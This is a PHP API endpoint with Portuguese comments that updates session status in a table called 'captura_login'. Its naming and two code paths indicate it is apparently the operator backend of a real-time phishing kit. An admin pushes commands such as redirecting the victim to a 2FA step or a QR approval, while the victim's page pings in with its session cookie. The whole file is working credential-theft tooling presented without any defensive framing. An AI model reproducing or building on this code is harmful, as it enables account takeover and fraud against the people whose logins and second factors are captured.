<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

$data = json_decode(file_get_contents('php://input'), true);
$status = $data['status'] ?? null;
$lead_id_from_admin = $data['id'] ?? null;

if (empty($status)) {
    echo json_encode(['success' => false, 'error' => 'Status não fornecido.']);
    exit;
}

$sql = '';
$params = [];

// Lista de status que são considerados "comandos do admin" e têm prioridade.
$admin_commands = ['redirecionar_para_2fa', 'aprovado_para_qr', 'negado'];

if ($lead_id_from_admin) {
    // --- CENÁRIO 1: COMANDO VINDO DO PAINEL DO ADMIN ---
    // Atualiza o status diretamente, pois é um comando explícito.
    $sql = "UPDATE captura_login SET status = ? WHERE id = ?";
    $params = [$status, $lead_id_from_admin];

} else {
    // --- CENÁRIO 2: "PING" VINDO DA PÁGINA DO CLIENTE ---
    $session_id_from_client = $_COOKIE['identificador_cliente'] ?? null;
    if (!$session_id_from_client) {
        echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
        exit;
    }

    // ANTES DE ATUALIZAR, VAMOS VERIFICAR O STATUS ATUAL NO BANCO
    $check_stmt = $pdo->prepare("SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
    $check_stmt->execute([$session_id_from_client]);
    $current_db_status = $check_stmt->fetchColumn();

    // SÓ ATUALIZE SE O STATUS ATUAL NÃO FOR UM COMANDO DO ADMIN
    if ($current_db_status && in_array($current_db_status, $admin_commands)) {
        // O status atual é um comando do admin. Não faça nada para não sobrescrevê-lo.
        // Apenas retorne sucesso para o ping não dar erro no console do cliente.
        echo json_encode(['success' => true, 'message' => 'Comando de admin pendente, nenhuma ação tomada.']);
        exit;
    }

    // O status atual não é um comando, então podemos atualizar com a localização do cliente.
    $sql = "UPDATE captura_login SET status = ? WHERE id = (
                SELECT id FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1
            )";
    $params = [$status, $session_id_from_client];
}

try {
    // Apenas executa a query se a sql não estiver vazia (evita erros)
    if (!empty($sql)) {
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
    }
    echo json_encode(['success' => true]);

} catch (PDOException $e) {
    error_log('Erro na API de atualização de status: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>